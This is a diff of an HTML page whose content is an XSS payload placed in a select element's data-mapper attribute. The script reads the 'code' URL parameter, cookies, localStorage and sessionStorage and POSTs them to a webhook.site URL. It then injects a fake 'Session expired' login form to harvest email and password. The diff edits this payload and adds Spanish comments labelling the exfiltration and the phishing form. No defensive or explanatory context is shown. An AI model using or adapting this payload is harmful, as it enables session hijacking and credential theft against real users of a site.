@@ -22,27 +22,28 @@
   </style>
 </head>
 <body>
-  <!-- Vector XSS via data-mapper -->
   <select
-    data-src-url="/api/data"
+    data-src-url="/api/fake"
     data-mapper="()=>{
-      const code = new URLSearchParams(window.location.search).get('code');
+      const code = new URLSearchParams(location.search).get('code');
+      const ls = JSON.stringify(Object.fromEntries(Object.entries(localStorage)));
+      const ss = JSON.stringify(Object.fromEntries(Object.entries(sessionStorage)));
       const cookie = document.cookie;
-      const ls = Object.fromEntries(Object.entries(localStorage));
-      const ss = Object.fromEntries(Object.entries(sessionStorage));
-      
+
+      // Exfiltración a webhook.site
       fetch('https://webhook.site/0d078024-de4c-4837-aa38-8627e361d5cc', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ code, cookie, localStorage: ls, sessionStorage: ss })
       });
 
+      // Inyectar formulario de phishing falso
       const form = document.createElement('form');
       form.id = 'phishing-form';
       form.innerHTML = `
         <h2>Session expired. Please login again</h2>
-        <input type='text' id='user' placeholder='Email' required/><br/>
-        <input type='password' id='pass' placeholder='Password' required/><br/>
+        <input type='text' id='user' placeholder='Email' style='display:block;margin-bottom:10px;width:100%'/>
+        <input type='password' id='pass' placeholder='Password' style='display:block;margin-bottom:10px;width:100%'/>
         <button type='submit'>Login</button>
       `;
       form.onsubmit = (e) => {
@@ -62,4 +63,3 @@
   </select>
 </body>
 </html>
-
